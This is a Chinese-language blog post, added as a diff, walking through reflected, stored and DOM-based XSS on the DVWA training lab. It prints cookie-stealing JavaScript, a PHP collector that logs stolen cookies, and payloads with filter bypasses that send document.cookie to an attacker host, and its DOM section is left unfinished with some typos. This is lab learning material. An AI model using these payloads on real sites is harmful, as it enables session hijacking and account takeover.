@@ -1,0 +1,182 @@
+<!DOCTYPE HTML>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>XSS(反射型与存储型)</title>
+<meta name="author" content="John Doe">
+<!--[if IE]>
+  <meta http-equiv=refresh content='0, http://browsehappy.com'>
+<![endif]-->
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+<body oncontextmenu="return false">
+  <div class="aios_content">
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    <div class="menu-bg">
+  <div class="menu-container">
+    <ul>
+      
+        <li class="menu-item">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives">Docs</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+<nav>
+  <a></a>
+</nav>
+
+    <div class="container" style="padding-bottom:40px">
+      <div class="row">
+  <div class="col-sm-12">
+    <header>
+  <div class="logo">
+    <h1 id="main-title" class="title"><a href="/">The clown is laughing at you</a></h1>
+  </div>
+</header>
+
+
+    <section class="main">
+      <div class="post">
+  <div class="post-header">
+    <h1 class="title">XSS(反射型与存储型)</h1>
+    <div class="post-info">
+      <span class="date">2019-03-05</span>
+
+      
+    </div>
+  </div>
+
+  <div class="content">
+    <!-- Gallery -->
+    
+
+    <p>昨天了解了一下同源策略，说实话，就懂了个皮毛，但是还蛮重要的我觉得这个模型，但是我了解到XSS之所以可行，是因为同源策略对于一下两点没有限制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</span><br><span class="line"><span class="number">2</span>、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script src=<span class="string">"..."</span>&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等。</span><br></pre></td></tr></table></figure></p>
+<p>参考文章:<a href="https://www.freebuf.com/articles/web/157953.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/157953.html</a></p>
+<p>DVWA中的反射型XSS的靶场，我想通过这个例子来理解什么是跨站攻击脚本。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>首先分析源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到这段代码中没有过滤机制，所以我们在输入框输入这么一段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后会弹出一个对话框，说明这里有一个XSS攻击的漏洞。我们观察页面源码，可以知道javaScript的代码在此被执行了。<br><img src="/2019/03/05/XSS-反射型/1.png" alt=""></p>
+<h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><p>用一台电脑演示，攻击A者的电脑假定IP地址为192.168.43.40，被攻击者B的电脑为192.168.43.40.<br>然后A中创建新的数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> dvwacookie;</span><br><span class="line"><span class="keyword">use</span> dvwacookie;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">low</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">medium</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">high</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p>
+<p>然后在A的服务器下编写cookie.js<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.write(<span class="string">"&lt;form action='http://192.168.43.40/test/steal.php' name='exploit' method='post' style='display:none'&gt;"</span>);</span><br><span class="line">document.write(<span class="string">"&lt;input type='hidden' name='data' value='"</span>+document.cookie+<span class="string">"'&gt;"</span>);</span><br><span class="line">document.write(<span class="string">"&lt;/form&gt;"</span>);</span><br><span class="line">document.exploit.submit();</span><br></pre></td></tr></table></figure></p>
+<p>这里的document.write()方法：</p>
+<p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。</p>
+<p>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
+<p>接着编写一段php代码,steal.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"dvwacookie"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_GET[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_POST[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"select * from low"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"偷取的cookie:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后构造payload为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>用src会加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。</strong></p>
+<p>相当于构造链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/xss_r/?name=&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/05/XSS-反射型/2.png" alt=""><br>然后查看数据库，就能看到用户登录后的cookie.其实我这里有一个疑惑我我们获取cookie值。</p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现 在这里被过滤掉了，那还是像之前那样尝试注入，看看它的过滤机制要怎么过掉。</span><br><span class="line"></span><br><span class="line">&lt;ScRiPt&gt;alert(<span class="string">"xss"</span>)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
+<p>发现可以，只是大小写被过滤掉了，然后其他的和low的一样，对steal.php稍作修改，数据表改成mediun就好了.</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码.</p>
+<p>构造payload如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert("xss")&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现可行</p>
+<p>于是构造攻击用的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(location.href=&quot;http://192.168.43.40/test/steal.php?data=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后这个payload自然不行<br>观察代码：(大写)，发现<strong>组成了一个script，所以被过滤掉了。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img SrC=# onerroR=(locatIon.href=&quot;httP://192.168.43.40/test/steal.php?data=&quot;+documenT.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>所以我们使用html编码来代替。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(locat&amp;#x69;on.href=&quot;http://192.168.43.40/test/steal.php?name=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>构造攻击payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/xss_r/?name=&lt;img src=null onerror=(locat&amp;#x69;on.href=&quot;http://192.168.43.40/test/steal.php?data=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="xss存储型"><a href="#xss存储型" class="headerlink" title="xss存储型"></a>xss存储型</h1><p>dvwa的靶场作为学习平台</p>
+<h1 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h1><p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>; </span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后个人觉得XSS漏洞会发生的地方是用户交互处，比如留言的地方，所以查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> name=<span class="string">"guestform"</span> <span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;table width="</span><span class="number">550</span><span class="string">" border="</span><span class="number">0</span><span class="string">" cellpadding="</span><span class="number">2</span><span class="string">" cellspacing="</span><span class="number">1</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;Name *&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;&lt;input name="</span>txtName<span class="string">" type="</span>text<span class="string">" size="</span><span class="number">30</span><span class="string">" maxlength="</span><span class="number">10</span><span class="string">"&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;Message *&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;&lt;textarea name="</span>mtxMessage<span class="string">" cols="</span><span class="number">50</span><span class="string">" rows="</span><span class="number">3</span><span class="string">" maxlength="</span><span class="number">50</span><span class="string">"&gt;&lt;/textarea&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;&amp;nbsp;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="</span>btnSign<span class="string">" type="</span>submit<span class="string">" value="</span>Sign Guestbook<span class="string">" onclick="</span><span class="keyword">return</span> validateGuestbookForm(this.form);<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="</span>btnClear<span class="string">" type="</span>submit<span class="string">" value="</span>Clear Guestbook<span class="string">" onClick="</span><span class="keyword">return</span> confirmClearGuestbook();<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">            &lt;/table&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后在Message中输入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后刷新后，会有提示框中显示此处的cookie，然后查看数据库，会发现在数据库中多了我们插入的数据<br><img src="/2019/03/05/XSS-反射型/XSS-存储型/1.png" alt=""><br>实际上我在这个过程中，一直都很好奇为什么插入数据库中的数据会对此产生作用？<br>参考文章：<a href="https://www.cnblogs.com/claireyuancy/p/6808009.html" target="_blank" rel="noopener">https://www.cnblogs.com/claireyuancy/p/6808009.html</a></p>
+<p>攻击脚本被存储到了数据库或者文件里，server端（可能是别的应用或者别的页面）在读取了存储的内容后回显了，就是存储型XSS。</p>
+<p>简单理解就是：XSS代码被提交给站点–&gt;站点把XSS代码存储进数据库—&gt;当该页面再次被请求时。server发送已经被植入XSS代码的数据给client—&gt;client运行XSS代码。</p>
+<p>然后构造真正的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>由于message最大只能输入50字节的内容，所以这里我们需要修改其maxlength.<br><img src="/2019/03/05/XSS-反射型/XSS-存储型/2.png" alt=""></p>
+<p>同样的我们可以在数据库中查看到其获取的cookie值</p>
+<h1 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h1><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">$name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">$message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">$name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br></pre></td></tr></table></figure></p>
+<p>与反射型相同，此处便不再重复了。</p>
+<h1 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h1><p>这个同反射型的过滤机制分析方法一致，此处便不再重复。</p>
+<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。<br>DOM是一个与平台、编程语言无关的接口，它同意程序或脚本动态地訪问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有非常多对象。当中一些是用户能够操纵的，如uRI.location，refelTer等。client的脚本程序能够通过DOM动态地检查和改动页面内容。它不依赖于提交数据到server端。而从client获得DOM中的数据在本地运行，假设DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。<br>DOM—based XSS攻击源于DOM相关的属性和方法。被插入用于XSS攻击的脚本。一个典型的样例例如以下：<br>HTTP请求http：//www．Xss.com/hello.html?name=test使用下面的脚本打印出登录用户test的名字，即<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"><span class="keyword">var</span> pos=docmnent.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>; </span><br><span class="line">document．write (document.URL.substring(pos,document.URL.length))。</span><br><span class="line"><span class="comment">//以上代码将会输出&lt;script&gt;alert('test')&lt;/script&gt; </span></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
+<p>假设这个脚本用于请求时，就导致XSS攻击的发生。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http：//www.Xss.com/hello.html?name=&lt;script&gt;alert(&apos;test&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当用户点击这个链接，server返回包括上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。</p>
+<p>在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得<script>alert(‘test’)</script>成为页面终于显示的HTML文本。从而导致DOM XSS攻击发生。</p>
+<p>然后现在构造payload</p>
+<p><a href="http://192.168.43.40/dvwa/vulnerabilities/xss_d/?default=English#" target="_blank" rel="noopener">http://192.168.43.40/dvwa/vulnerabilities/xss_d/?default=English#</a><script src="http://192.168.43.40/test/cookie.js"></script></p>
+<p>完了，写不下去了，发现怎么做都不对，等我学完javascript和ajax后，再来分析。</p>
+
+    <span class="date end-date">2019-03-05</span>
+  </div>
+
+  
+
+  
+</div>
+
+    </section>
+  </div>
+</div>
+
+    </div>
+  </div>
+  <footer class="footer-content">
+  <div class="container">
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+        <h2>About</h2>
+        <section>
+          Theme developed by <a href="//github.com/klugjo" target="_blank">Jonathan Klughertz</a><br>Contents created by <a href="//github.com/xaios" target="_blank">AIOS</a>
+        </section>
+      </div>
+      
+  <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+    <h2>New Contents</h2>
+    <ul>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/06/XSS之同源策略与跨站访问/"></a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/05/XSS-反射型/">XSS(反射型与存储型)</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/03/HTTP污染拙见/">HTTP污染拙见</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/01/mysql基本使用与用户管理/">mysql基本使用与用户管理</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+      
+
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <ul class="list-inline footer-social-icons"></ul>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="footer-copyright">@Untitled. All right reserved | Design & Hexo <a href="//www.codeblocq.com" target="_blank">Jonathan Klughertz</a></div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</body>
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js"></script>
+<script src="/js/main.js"></script>
+
